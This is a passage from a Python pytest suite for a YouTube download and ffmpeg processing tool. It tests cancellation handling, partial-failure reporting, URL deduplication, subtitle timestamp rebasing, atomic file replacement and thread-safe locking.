    import threading
    from Final.yt_final import YouTubeDownloader
    import Final.yt_final as ytf
    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.max_workers = 16
    dl._tls = threading.local()
    dl._warm_probe_caches = lambda spec: None

    def fake_download(u, *a, **k):
        if u == 'bad':
            dl._tls.last_error = 'HTTP 403 bot-check'
            dl._tls.last_error_kind = 'bot_check'
            return []
        dl._tls.last_error = None
        dl._tls.last_error_kind = None
        return [f'/tmp/{u}.mp4']
    dl.download = fake_download

    warnings = []
    class _Log:
        def warning(self, m, *a): warnings.append(m % a if a else m)
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def debug(self, *a, **k): pass
    monkeypatch.setattr(ytf, 'logger', _Log())

    out = dl.download_parallel(['good', 'bad'], spec=None)
    assert out == ['/tmp/good.mp4'], out
    assert any('bad' in w and '403' in w for w in warnings), warnings
    # the survivor must not be reported as a failure
    assert not any('good' in w for w in warnings), warnings
    print('test_download_parallel_logs_partial_failures passed')


def test_download_parallel_reraises_cancel_not_partial_success(monkeypatch):
    """A worker raising DownloadCancelled mid-batch must ABORT the whole parallel batch — not get
    demoted to a per-URL error so the survivors are returned. Returning survivors makes run() record
    history/webhook 'done' while the journal resolves 'cancelled' (three channels, two verdicts).
    Mirrors _download_with_priority's cancel escape."""
    import threading, pytest
    from Final.yt_final import YouTubeDownloader, DownloadCancelled
    import Final.yt_final as ytf
    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.max_workers = 16
    dl._tls = threading.local()
    dl._warm_probe_caches = lambda spec: None

    def fake_download(u, *a, **k):
        if u == 'cancelled':
            raise DownloadCancelled('YT_FINAL_CANCEL')
        dl._tls.last_error = None
        dl._tls.last_error_kind = None
        return [f'/tmp/{u}.mp4']
    dl.download = fake_download

    class _Log:
        def warning(self, *a, **k): pass
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def debug(self, *a, **k): pass
    monkeypatch.setattr(ytf, 'logger', _Log())

    # The cancel must propagate out of download_parallel, not be swallowed into a survivor return.
    with pytest.raises(DownloadCancelled):
        dl.download_parallel(['good', 'cancelled'], max_workers=1, spec=None)
    print('test_download_parallel_reraises_cancel_not_partial_success passed')


def test_run_records_cancel_as_cancelled_not_failed():
    """B3: a DownloadCancelled from the body must reach history AND the webhook as 'cancelled', not
    'failed' — so the ledger and webhook agree with the queue row the worker commits. A genuine
    error still records 'failed'. Post-download path only; the transfer path is untouched."""
    import threading, pytest
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine, DownloadCancelled, JobSpec

    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    eng._run_output_lock = threading.Lock()
    eng.downloader = SimpleNamespace(output_path='/tmp')
    captured = {}
    eng._record_history = lambda spec, result, status=None: captured.__setitem__('hist', status)
    eng._spawn_notify = lambda spec, **kw: captured.__setitem__('notify', kw.get('status'))

    spec = JobSpec(urls=['https://youtu.be/x'])

    eng._run_body = lambda spec, urls, dl: (_ for _ in ()).throw(DownloadCancelled('YT_FINAL_CANCEL'))
    with pytest.raises(DownloadCancelled):
        eng.run(spec)
    assert captured.get('hist') == 'cancelled', captured
    assert captured.get('notify') == 'cancelled', captured

    # control: a real failure is still 'failed'
    captured.clear()
    eng._run_body = lambda spec, urls, dl: (_ for _ in ()).throw(RuntimeError('network died'))
    with pytest.raises(RuntimeError):
        eng.run(spec)
    assert captured.get('hist') == 'failed', captured
    assert captured.get('notify') == 'failed', captured
    print('test_run_records_cancel_as_cancelled_not_failed passed')


def test_run_dedupes_canonical_video_aliases_before_worker_handoff():
    """Exact repeats and confirmed single-video aliases collapse before _run_body dispatch."""
    import threading
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec

    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    eng._run_output_lock = threading.Lock()
    eng.downloader = SimpleNamespace(output_path='/tmp', last_partial_errors=None)
    eng._record_history = lambda spec, result, status=None: None
    eng._spawn_notify = lambda spec, **kw: None

    seen = {}
    eng._run_body = lambda spec, urls, dl: (seen.__setitem__('urls', list(urls)) or [])

    video_id = 'dQw4w9WgXcQ'
    first = f'https://youtu.be/{video_id}'
    second = f'https://www.youtube.com/watch?v={video_id}'
    playlist = f'https://www.youtube.com/watch?v={video_id}&list='
    eng.run(JobSpec(urls=[first, 'http://b', second, 'http://b', playlist, playlist]))
    assert seen['urls'] == [first, 'http://b', playlist], seen
    print('test_run_dedupes_canonical_video_aliases_before_worker_handoff passed')


def test_download_parallel_dedupes_aliases_before_submit(monkeypatch):
    """The public pool entry point must canonicalize even when callers bypass Engine.run()."""
    import threading
    from Final.yt_final import YouTubeDownloader

    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.max_workers = 4
    dl._tls = threading.local()
    dl._warm_probe_caches = lambda spec=None: None
    dl.last_partial_errors = None
    seen = []

    def fake_download(url, *args, **kwargs):
        seen.append(url)
        dl._tls.last_error = None
        dl._tls.last_error_kind = None
        return [url]

    dl.download = fake_download
    video_id = 'dQw4w9WgXcQ'
    aliases = [
        f'https://youtu.be/{video_id}',
        f'https://www.youtube.com/watch?v={video_id}',
    ]

    result = dl.download_parallel((url for url in aliases), max_workers=2)

    assert result == [aliases[0]]
    assert seen == [aliases[0]]


def test_loudnorm_pass1_is_cancelable(monkeypatch):
    """B3: a cancel during loudnorm PASS-1 (the whole-audio measurement) must interrupt promptly, not
    wait up to the 900s ceiling. Pass-1 now runs via Popen + a drain thread with a 0.3s cancel poll;
    the default (no cancel_check) path still just waits for stderr to close."""
    import threading, time, subprocess, pytest
    from Final.yt_final import FFmpegProcessor, DownloadCancelled

    proc = FFmpegProcessor.__new__(FFmpegProcessor)
    proc.ffmpeg = 'ffmpeg'
    proc.cancel_check = lambda: True                 # a cancel is already pending

    blocking = threading.Event()

    class _FakePipe:
        def __iter__(self): return self
        def __next__(self):
            blocking.wait(5)                         # emulate ffmpeg still reading the audio
            raise StopIteration
    class _FakeProc:
        def __init__(self): self.returncode = None; self.stderr = _FakePipe()
        def poll(self): return self.returncode
        def kill(self): self.returncode = -9; blocking.set()
        def wait(self, timeout=None):
            if self.returncode is None: self.returncode = -9
            return self.returncode

    monkeypatch.setattr(subprocess, 'Popen', lambda *a, **k: _FakeProc())
    monkeypatch.setattr(FFmpegProcessor, '_begin_ffmpeg_activity', staticmethod(lambda: None))
    monkeypatch.setattr(FFmpegProcessor, '_end_ffmpeg_activity', staticmethod(lambda: None))

    t0 = time.time()
    with pytest.raises(DownloadCancelled):
        proc.normalize_audio('in.mp4', 'out.mp4', target_lufs=-14.0)
    assert time.time() - t0 < 3, 'cancel did not interrupt loudnorm pass-1 promptly'
    print('test_loudnorm_pass1_is_cancelable passed')


def test_download_parallel_surfaces_partial_failures_in_meta(monkeypatch):
    """B4: partial-failure URLs must reach the durable job meta (result_meta -> job card), not just
    the server log, while the batch still returns its survivors and the done/failed gate is unchanged."""
    import threading
    from Final.yt_final import YouTubeDownloader
    import Final.yt_final as ytf
    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.max_workers = 16
    dl._tls = threading.local()
    dl._warm_probe_caches = lambda spec: None
    dl.last_partial_errors = None
    dl.speed_stats = lambda: {}
    dl._throttle_hint = lambda *a, **k: None

    def fake_download(u, *a, **k):
        if u == 'bad':
            dl._tls.last_error = 'HTTP 403'; dl._tls.last_error_kind = 'bot_check'; return []
        dl._tls.last_error = None; dl._tls.last_error_kind = None; return [f'/tmp/{u}.mp4']
    dl.download = fake_download
    monkeypatch.setattr(ytf, 'logger', type('L', (), {m: (lambda *a, **k: None)
                        for m in ('warning', 'info', 'error', 'debug')})())

    out = dl.download_parallel(['good', 'bad'], spec=None)
    assert out == ['/tmp/good.mp4'], out
    assert dl.last_partial_errors == [('bad', ('HTTP 403', 'bot_check'))], dl.last_partial_errors
    meta = dl.result_meta()
    assert meta.get('partial_failures') == [{'url': 'bad', 'error': 'HTTP 403', 'kind': 'bot_check'}], meta

    # after a reset (what _run_body does per job), an all-success run carries NO partial_failures
    dl.last_partial_errors = None
    out2 = dl.download_parallel(['good'], spec=None)
    assert out2 == ['/tmp/good.mp4']
    assert 'partial_failures' not in dl.result_meta()
    print('test_download_parallel_surfaces_partial_failures_in_meta passed')


def test_rebase_subtitle_files_is_atomic(tmp_path, monkeypatch):
    """#3/B6: subtitle rebasing must be atomic — a failed replace leaves the original subtitle intact
    and leaves no temp litter — via a UNIQUE temp that can't clobber a pre-existing file, and it
    preserves the original file mode."""
    import os
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine
    import Final.yt_final as ytf
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)

    vtt = tmp_path / 'clip.vtt'
    original = "WEBVTT\n\n00:01:35.000 --> 00:01:40.000\nhello\n"
    vtt.write_text(original, encoding='utf-8')
    os.chmod(str(vtt), 0o600)                         # a non-default mode we must preserve
    spec = SimpleNamespace(section='90-180')

    # a pre-existing file NAMED like the old deterministic temp must NOT be touched
    decoy = tmp_path / 'clip.vtt.rebasetmp'
    decoy.write_text('do not clobber me', encoding='utf-8')

    # happy path: cue 95-100s rebases to 5-10s, original mode preserved, decoy untouched
    eng._rebase_subtitle_files([str(vtt)], spec)
    assert '00:00:05.000 --> 00:00:10.000' in vtt.read_text(encoding='utf-8')
    # Windows os.chmod only models the read-only bit, so chmod(0o600) reports back 0o666 and the
    # 0o600 preservation assertion cannot hold there (the product still best-effort copies the mode
    # via os.stat/os.chmod in _rebase_subtitle_files, which is a near no-op on Windows). Assert it
    # only where mode bits are faithful.
    if os.name != 'nt':
        assert (os.stat(str(vtt)).st_mode & 0o777) == 0o600, 'original file mode was not preserved'
    assert decoy.read_text(encoding='utf-8') == 'do not clobber me', 'a same-named file was clobbered'
    good = vtt.read_text(encoding='utf-8')

    # failure path: the atomic replace fails -> original survives, no temp left behind
    monkeypatch.setattr(ytf.os, 'replace',
                        lambda *a, **k: (_ for _ in ()).throw(OSError(28, 'No space left on device')))
    eng._rebase_subtitle_files([str(vtt)], spec)
    assert vtt.read_text(encoding='utf-8') == good, 'original subtitle corrupted on failed replace'
    leftovers = [q.name for q in tmp_path.iterdir() if q.name.startswith('clip.vtt.') and q.name.endswith('.tmp')]
    assert not leftovers, f'temp litter left behind: {leftovers}'
    print('test_rebase_subtitle_files_is_atomic passed')


def test_rebase_ass_text_clips_clamps_and_rebases():
    """B6: ASS Dialogue cues must clip/clamp/rebase onto the section window like SRT/VTT do, with the
    trailing Text field (which may contain commas) preserved."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    ass = (
        "[Script Info]\nTitle: x\n\n"
        "[V4+ Styles]\nFormat: Name, Fontname\nStyle: Default,Arial\n\n"
        "[Events]\n"
        "Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
        "Dialogue: 0,0:00:10.00,0:00:20.00,Default,,0,0,0,,before window\n"
        "Dialogue: 0,0:01:25.00,0:01:35.00,Default,,0,0,0,,overlaps start\n"
        "Dialogue: 0,0:01:35.00,0:01:40.00,Default,,0,0,0,,hello, world\n"
    )
    out = E._rebase_ass_text(ass, 90.0, 180.0)
    assert 'before window' not in out, 'cue entirely before the clip must be dropped'
    assert '0:00:00.00,0:00:05.00' in out and 'overlaps start' in out, 'overlap must clamp to 0-5s'
    assert '0:00:05.00,0:00:10.00' in out, 'in-window cue 95-100 must rebase to 5-10s'
    assert 'hello, world' in out, 'Text field comma must be preserved'
    assert '[Events]' in out and 'Format: Layer' in out, 'headers preserved'


def test_rebase_ass_text_is_failsafe():
    """No parseable [Events] Format -> return the original untouched (never corrupt a style script)."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    junk = "[Script Info]\nTitle: x\nnot really ass\n"
    assert E._rebase_ass_text(junk, 90.0, 180.0) == junk


def test_run_ffmpeg_cancel_interrupts_a_silent_process(tmp_path):
    """B3/F: a cancel must interrupt even a SILENT ffmpeg that emits no stderr lines (startup, or the
    mp4 +faststart moov relocation). The old inline read blocked until a line arrived; the drain
    thread + 0.3s poll fires regardless of output."""
    import sys as _sys, time as _t, pytest
    from Final.yt_final import FinalYouTubeGPUEngine, DownloadCancelled
    proc = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).processor
    # a fake ffmpeg that produces NO stderr and just sleeps (would hang the old line-blocked reader)
    silent = [_sys.executable, '-c', 'import time\ntime.sleep(30)']
    proc.cancel_check = lambda: True
    t0 = _t.monotonic()
    with pytest.raises(DownloadCancelled):
        proc._run_ffmpeg(silent)
    assert _t.monotonic() - t0 < 5.0, 'cancel did not interrupt a silent ffmpeg'
    print('test_run_ffmpeg_cancel_interrupts_a_silent_process passed')


def test_run_resets_partial_failures_inside_the_lock_before_early_return():
    """#5a: last_partial_errors must be cleared INSIDE the per-engine run lock (before the empty-URL
    early return), NOT before it — resetting outside the lock let a concurrent run() clobber/inherit
    another job's partial-failure list. The reset must not be visible until the lock is held."""
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    eng.downloader = SimpleNamespace(last_partial_errors=[('u', ('stale', 'k'))], output_path='/tmp')
    seen = {}

    class _Lock:
        def __enter__(self):
            seen['at_enter'] = eng.downloader.last_partial_errors   # value BEFORE any reset
            return self
        def __exit__(self, *a):
            return False
    eng._run_output_lock = _Lock()

    assert eng.run(JobSpec(urls=[])) == []
    assert seen['at_enter'] == [('u', ('stale', 'k'))], 'reset happened BEFORE the lock (regression)'
    assert eng.downloader.last_partial_errors is None, 'reset did not happen inside the lock'


def test_download_parallel_records_url_with_no_error_message(monkeypatch):
    """#5: a URL that produced no file but set NO thread-local error must STILL appear in
    partial_failures (with a generic message), not vanish because no message was captured."""
    import threading
    from Final.yt_final import YouTubeDownloader
    import Final.yt_final as ytf
    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.max_workers = 16
    dl._tls = threading.local()
    dl._warm_probe_caches = lambda spec: None
    dl.last_partial_errors = None

    def fake_download(u, *a, **k):
        dl._tls.last_error = None            # NO error set, empty result
        dl._tls.last_error_kind = None
        return [] if u == 'silent' else [f'/tmp/{u}.mp4']
    dl.download = fake_download
    monkeypatch.setattr(ytf, 'logger', type('L', (), {m: (lambda *a, **k: None)
                        for m in ('warning', 'info', 'error', 'debug')})())

    out = dl.download_parallel(['good', 'silent'], spec=None)
    assert out == ['/tmp/good.mp4']
    assert dl.last_partial_errors and dl.last_partial_errors[0][0] == 'silent'
    assert 'no file produced' in dl.last_partial_errors[0][1][0]


def test_rebase_ass_text_failsafe_when_text_not_last():
    """#4: the comma-bounded split assumes Text is the LAST field; if it isn't, leave the file
    untouched rather than mangle it."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    ass = ("[Events]\n"
           "Format: Layer, Start, End, Text, Style\n"          # Text NOT last
           "Dialogue: 0,0:01:35.00,0:01:40.00,hello,Default\n")
    assert E._rebase_ass_text(ass, 90.0, 180.0) == ass


def test_rebase_ass_text_all_or_nothing_on_malformed_event():
    """#4: a single unparseable event must fail the WHOLE file unchanged, never a mixed
    source/clip timeline."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    ass = ("[Events]\n"
           "Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
           "Dialogue: 0,0:01:35.00,0:01:40.00,Default,,0,0,0,,good\n"
           "Dialogue: 0,BROKEN,0:01:40.00,Default,,0,0,0,,bad\n")   # unparseable Start
    assert E._rebase_ass_text(ass, 90.0, 180.0) == ass


def test_find_sidecar_subs_includes_ssa(tmp_path):
    """#4: .ssa sidecars must be discovered (and thus rebased) like .ass/.srt/.vtt."""
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    src = tmp_path / 'video.mp4'
    src.write_text('x')
    for name in ('video.en.srt', 'video.en.ssa', 'video.en.ass'):
        (tmp_path / name).write_text('x')
    found = [p.name for p in eng._find_sidecar_subs(src)]
    assert 'video.en.ssa' in found


def test_rebase_ass_text_typical_real_file():
    """#4: a typical real ASS (Script Info + V4+ Styles + Events with Dialogue AND Comment, Effect,
    override tags {\\i1}, commas in Text) rebases correctly and preserves non-event content."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    ass = (
        "[Script Info]\nScriptType: v4.00+\nPlayResX: 1920\n\n"
        "[V4+ Styles]\n"
        "Format: Name, Fontname, Fontsize, PrimaryColour\n"
        "Style: Default,Arial,48,&H00FFFFFF\n\n"
        "[Events]\n"
        "Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
        "Comment: 0,0:01:35.00,0:01:40.00,Default,,0,0,0,,translator note, keep\n"
        "Dialogue: 0,0:01:35.00,0:01:40.00,Default,,0,0,0,,{\\i1}Hello{\\i0}, world\n"
        "Dialogue: 0,0:00:10.00,0:00:20.00,Default,,0,0,0,,dropped\n"
    )
    out = E._rebase_ass_text(ass, 90.0, 180.0)
    # section headers/styles preserved verbatim
    assert '[Script Info]' in out and 'Style: Default,Arial,48,&H00FFFFFF' in out
    assert 'Format: Layer, Start, End' in out
    # in-window Dialogue rebased 95->5s, override tags + comma-in-Text intact
    assert '0:00:05.00,0:00:10.00' in out
    assert '{\\i1}Hello{\\i0}, world' in out
    # the Comment (same window) is also rebased and kept
    assert 'translator note, keep' in out
    # the out-of-window Dialogue is dropped
    assert 'dropped' not in out


def test_subtitle_rebase_carry_rollover_never_emits_60():
    """#4: the carry must roll a rounding overflow up (ms/cs -> s -> mm -> h), never emitting ':60'.
    A fractional section start (cs=0.0004) rebases a 60.0s cue to 59.9996s, which rounds to a whole
    minute — WITHOUT the carry the formatter would emit ':00:60'. Exercised for VTT/SRT/ASS."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    CS = 0.0004                                   # sub-ms section start -> forces the rounding overflow

    vtt = "WEBVTT\n\n00:01:00.000 --> 00:01:01.000\ntail\n"
    out_vtt = E._rebase_subtitle_text(vtt, CS, 3600.0)
    assert '00:01:00.000' in out_vtt and ':60' not in out_vtt, out_vtt

    srt = "1\n00:01:00,000 --> 00:01:01,000\ntail\n"
    out_srt = E._rebase_subtitle_text(srt, CS, 3600.0)
    assert '00:01:00,000' in out_srt and ':60' not in out_srt, out_srt

    ass = ("[Events]\n"
           "Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
           "Dialogue: 0,0:01:00.00,0:01:01.00,Default,,0,0,0,,tail\n")
    out_ass = E._rebase_ass_text(ass, CS, 3600.0)
    assert '0:01:00.00' in out_ass and ':60' not in out_ass, out_ass


def test_run_serializes_partial_failures_across_two_threads():
    """#5a: with a REAL lock, concurrent run() on one engine must serialize — job B blocks until A
    finishes, then resets to a clean partial-failure list, never inheriting A's. Event-driven: a
    signaling lock proves B actually REACHED acquire() (while A held it) before we let A go, so it
    can't pass spuriously under delayed scheduling; both threads' termination + exceptions are checked."""
    import threading
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec

    class _SignalLock:
        def __init__(self):
            self._lock = threading.Lock()
            self._n = 0
            self.second_acquire = threading.Event()   # fires when a 2nd acquire is ATTEMPTED (B)
        def acquire(self, *a, **k):
            self._n += 1
            if self._n == 2:
                self.second_acquire.set()
            return self._lock.acquire(*a, **k)
        def release(self):
            return self._lock.release()
        def __enter__(self):
            self.acquire(); return self
        def __exit__(self, *a):
            self.release(); return False

    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    dl = SimpleNamespace(last_partial_errors=None, output_path='/tmp')
    eng.downloader = dl
    lock = _SignalLock()
    eng._run_output_lock = lock
    eng._record_history = lambda *a, **k: None
    eng._spawn_notify = lambda *a, **k: None
    a_in = threading.Event(); a_go = threading.Event()
    seen = {}
    errs = {}

    def body(spec, urls, dljob):
        if spec.urls[0] == 'A':
            dl.last_partial_errors = [('A', ('x', 'k'))]
            a_in.set()
            a_go.wait(3)                             # hold the lock until B has reached acquire()
            return ['/tmp/a.mp4']
        seen['B_partials'] = dl.last_partial_errors   # what B sees AFTER its own reset
        return ['/tmp/b.mp4']
    eng._run_body = body

    def run_job(u):
        try:
            eng.run(JobSpec(urls=[u]))
        except BaseException as e:                   # capture so a thread error can't pass silently
            errs[u] = e

    tA = threading.Thread(target=run_job, args=('A',)); tA.start()
    assert a_in.wait(3), 'A never entered the body'
    tB = threading.Thread(target=run_job, args=('B',)); tB.start()
    assert lock.second_acquire.wait(3), 'B never reached lock.acquire() (test could not prove blocking)'
    # B is now blocked in acquire() while A holds the lock -> it must NOT have reset/read yet
    assert 'B_partials' not in seen, 'B ran while A held the lock — not serialized'
    assert dl.last_partial_errors == [('A', ('x', 'k'))], 'A partials clobbered while it held the lock'
    a_go.set()
    tA.join(3); tB.join(3)
    assert not tA.is_alive() and not tB.is_alive(), 'a run() thread did not terminate'
    assert not errs, f'run() raised in a thread: {errs}'
    assert seen.get('B_partials') is None, 'B inherited A partial failures'


def test_progress_finished_tick_honors_pending_cancel():
    """#2: a cancel pending at the 'finished' progress tick (download done, finalize not started) must
    raise DownloadCancelled and NOT be swallowed by the finished branch."""
    import pytest
    from types import SimpleNamespace
    from Final.yt_final import YouTubeDownloader, DownloadCancelled
    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.cancel_check = lambda: True                 # a cancel is pending
    dl.progress_sink = lambda info: None
    with pytest.raises(DownloadCancelled):
        dl._progress_hook({'status': 'finished'})


def test_run_clears_partials_even_when_spec_parse_raises(monkeypatch):
    """#5a: JobSpec.from_dict runs OUTSIDE the run lock (so a re-entrant mapping can't deadlock); on a
    parse error the reset happens UNDER the lock before re-raising, so an invalid spec that fails to
    parse still clears a prior job's stale partial_failures (GPT: invalid input retained stale data)."""
    import threading, pytest
    from types import SimpleNamespace
    import Final.yt_final as ytf
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    eng.downloader = SimpleNamespace(last_partial_errors=['STALE'], output_path='/tmp')
    eng._run_output_lock = threading.Lock()
    monkeypatch.setattr(ytf.JobSpec, 'from_dict',
                        staticmethod(lambda d: (_ for _ in ()).throw(ValueError('bad spec'))))
    with pytest.raises(ValueError):
        eng.run({'not': 'a jobspec'})            # dict -> not JobSpec -> from_dict raises
    assert eng.downloader.last_partial_errors is None, 'stale partials retained when spec parse raised'


def test_progress_finished_tick_normal_path_calls_sink_without_raising():
    """#2: with NO cancel pending, the finished tick still notifies the sink and does not raise —
    the cancel check must not disturb the normal completion path."""
    from Final.yt_final import YouTubeDownloader
    dl = YouTubeDownloader.__new__(YouTubeDownloader)
    dl.cancel_check = lambda: False              # no cancel
    seen = []
    dl.progress_sink = lambda info: seen.append(info)
    dl._progress_hook({'status': 'finished'})    # must not raise
    assert seen and seen[-1].get('status') == 'finishing'


def test_run_no_deadlock_on_reentrant_spec_mapping():
    """#5a deadlock: from_dict's dict(spec) runs OUTSIDE the run lock, so a mapping that re-enters
    run() on this same engine during parsing must NOT deadlock on the non-reentrant lock."""
    import threading, collections.abc
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    eng.downloader = SimpleNamespace(last_partial_errors=None, output_path='/tmp')
    eng._run_output_lock = threading.Lock()
    eng._run_body = lambda spec, urls, dl: []
    eng._record_history = lambda *a, **k: None
    eng._spawn_notify = lambda *a, **k: None
    hits = {'n': 0}

    class Reentrant(collections.abc.Mapping):
        _d = {'urls': ['x']}
        def __getitem__(self, k): return self._d[k]
        def __len__(self): return len(self._d)
        def __iter__(self): return iter(self._d)
        def keys(self):
            if hits['n'] == 0:
                hits['n'] = 1
                eng.run(JobSpec(urls=[]))        # re-enter run() during dict(spec) parsing
            return self._d.keys()

    done = threading.Event()
    def go():
        try:
            eng.run(Reentrant())
        except Exception:
            pass
        finally:
            done.set()
    threading.Thread(target=go, daemon=True).start()
    assert done.wait(5), 'run() DEADLOCKED on a re-entrant spec mapping (from_dict under the lock)'
    assert hits['n'] == 1, 're-entrant parse path did not execute'


def test_rebase_subtitle_files_closes_fd_when_fdopen_fails(tmp_path, monkeypatch):
    """#3: if os.fdopen() itself fails, the raw mkstemp descriptor must be CLOSED (not leaked), the
    temp removed, and the original subtitle left intact."""
    import os
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine
    import Final.yt_final as ytf
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    vtt = tmp_path / 'clip.vtt'
    vtt.write_text("WEBVTT\n\n00:01:35.000 --> 00:01:40.000\nhi\n", encoding='utf-8')
    good = vtt.read_text(encoding='utf-8')

    real_close = os.close
    closed = {'fd': None}
    monkeypatch.setattr(ytf.os, 'fdopen',
                        lambda fd, *a, **k: (_ for _ in ()).throw(OSError('fdopen fail')))
    def rec_close(fd):
        closed['fd'] = fd
        return real_close(fd)
    monkeypatch.setattr(ytf.os, 'close', rec_close)

    eng._rebase_subtitle_files([str(vtt)], SimpleNamespace(section='90-180'))
    assert closed['fd'] is not None, 'fd was not closed when fdopen raised (descriptor leak)'
    assert vtt.read_text(encoding='utf-8') == good, 'original corrupted'
    leftovers = [q.name for q in tmp_path.iterdir() if q.name.endswith('.tmp')]
    assert not leftovers, f'temp litter: {leftovers}'


def test_rebase_subtitle_files_fdopen_close_then_raise_propagates_interrupt(tmp_path, monkeypatch):
    """#3/N4: if os.fdopen closes the fd THEN raises a BaseException (e.g. KeyboardInterrupt), the
    guarded os.close must swallow the resulting EBADF but the ORIGINAL interrupt must PROPAGATE — it
    must not be masked by an EBADF that the outer `except OSError` would then swallow."""
    import os, pytest
    from types import SimpleNamespace
    from Final.yt_final import FinalYouTubeGPUEngine
    import Final.yt_final as ytf
    eng = FinalYouTubeGPUEngine.__new__(FinalYouTubeGPUEngine)
    vtt = tmp_path / 'clip.vtt'
    vtt.write_text("WEBVTT\n\n00:01:35.000 --> 00:01:40.000\nhi\n", encoding='utf-8')
    real_close = os.close

    def fdopen_close_then_interrupt(fd, *a, **k):
        real_close(fd)                     # emulate fdopen closing fd before it raises
        raise KeyboardInterrupt()
    monkeypatch.setattr(ytf.os, 'fdopen', fdopen_close_then_interrupt)

    with pytest.raises(KeyboardInterrupt):
        eng._rebase_subtitle_files([str(vtt)], SimpleNamespace(section='90-180'))
    assert vtt.read_text(encoding='utf-8').startswith('WEBVTT'), 'original must survive'


def test_run_body_cancel_during_finalize_does_not_report_done(tmp_path):
    """Cancel mid-finalize (encode/merge/loudnorm) must re-raise DownloadCancelled — not fall back
    to the raw download as 'Done'. Regression: bare except Exception treated cancel as encode failure
    and returned the source path, so queue/webhook recorded ok/done after the user cancelled."""
    import pytest
    from Final.yt_final import FinalYouTubeGPUEngine, DownloadCancelled, JobSpec
    eng = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    raw = tmp_path / 'clip.mp4'
    raw.write_bytes(b'raw-media')
    eng.downloader.download = lambda *a, **k: k['_post_download']([raw])
    eng.downloader.download_parallel = lambda *a, **k: k['_post_download']([raw])
    eng.downloader.last_info = {str(raw): {'id': 'x', 'title': 't'}}

    def boom(src, spec):
        raise DownloadCancelled('YT_FINAL_CANCEL')
    eng._finalize = boom

    with pytest.raises(DownloadCancelled):
        eng._run_body(
            JobSpec(urls=['https://youtu.be/x'], quality='1080p', encode_mode='copy'),
            ['https://youtu.be/x'], eng.downloader)
    # Control: a genuine encode failure still falls back to the raw path when it exists.
    eng._finalize = lambda src, spec: (_ for _ in ()).throw(RuntimeError('encode failed'))
    out = eng._run_body(
        JobSpec(urls=['https://youtu.be/x'], quality='1080p', encode_mode='copy'),
        ['https://youtu.be/x'], eng.downloader)
    assert out == [raw], out


def test_encode_mode_none_drains_last_info(tmp_path):
    """encode_mode=none never calls _finalize (the sole last_info.pop site). Returning a download
    must still drain last_info so the long-lived web engine cannot accumulate distilled metadata."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    eng = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    raw = tmp_path / 'plain.mp4'
    raw.write_bytes(b'x')
    eng.downloader.download = lambda *a, **k: k['_post_download']([raw])
    eng.downloader.last_info = {str(raw): {'id': 'vid', 'title': 'Plain'}}
    out = eng._run_body(
        JobSpec(urls=['https://youtu.be/z'], quality='1080p', encode_mode='none'),
        ['https://youtu.be/z'], eng.downloader)
    assert out == [raw]
    assert str(raw) not in eng.downloader.last_info


def test_legacy_token_and_allow_public_are_absent_from_serve_help(monkeypatch, capsys):
    import pytest
    import Final.yt_final as ytf

    monkeypatch.setattr(ytf._sys, "argv", ["yt_final.py", "serve", "--help"])
    with pytest.raises(SystemExit) as exc:
        ytf.main()

    assert exc.value.code == 0
    help_text = capsys.readouterr().out
    assert "--token" not in help_text
    assert "--allow-public" not in help_text


def test_static_token_and_allow_public_are_omitted_from_cli_dispatch(monkeypatch, tmp_path):
    import sys
    import types
    import Final.yt_final as ytf

    calls = []

    def fake_serve(
        *,
        host,
        port,
        output_dir,
        queue_file,
        pot_base_url,
        pot_mode,
        open_browser,
    ):
        calls.append(
            {
                "host": host,
                "port": port,
                "output_dir": output_dir,
                "queue_file": queue_file,
                "pot_base_url": pot_base_url,
                "pot_mode": pot_mode,
                "open_browser": open_browser,
            }
        )

    monkeypatch.setitem(sys.modules, "webserver", types.SimpleNamespace(serve=fake_serve))
    monkeypatch.setattr(
        ytf._sys,
        "argv",
        [
            "yt_final.py",
            "--output-dir",
            str(tmp_path),
            "serve",
            "--host",
            "localhost",
            "--port",
            "9001",
            "--no-browser",
        ],
